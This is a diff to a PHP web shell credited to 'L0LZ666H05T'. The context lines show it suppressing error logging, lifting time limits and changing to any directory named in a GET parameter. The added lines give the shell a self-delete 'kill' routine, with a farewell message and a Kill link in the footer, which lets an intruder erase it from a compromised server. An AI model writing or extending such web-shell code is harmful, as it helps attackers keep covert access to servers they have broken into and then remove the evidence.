@@ -4,7 +4,6 @@ session_start();
 set_time_limit(0);
 ignore_user_abort(0);
 @clearstatcache();
-@ini_set('error_log',NULL);
 @ini_set('log_errors',0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
@@ -435,6 +434,12 @@ code {
 if (isset($_GET['dir'])) {
   @chdir($_GET['dir']);
 }
+if($_GET['do'] == 'kill') {
+	if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
+			die('<center><br><center><h2>Shell removed</h2><br>Goodbye , Thanks for take my shell today</center></center>');
+		else
+			echo '<center>unlink failed!</center>';
+}
 ?>
 <table align="center" width="90%">
   <tr>
@@ -789,6 +794,6 @@ foreach (@scandir(@cwd()) as $file) {
 ?>
 <tr style="border:none;">
   <th colspan="4">
-    &copy; L0LZ666H05T - <?php print @date("Y") ?>
+    &copy; L0LZ666H05T - <?php print @date("Y") ?> | <a href="?do=kill">Kill</a>
   </th>
 </tr>
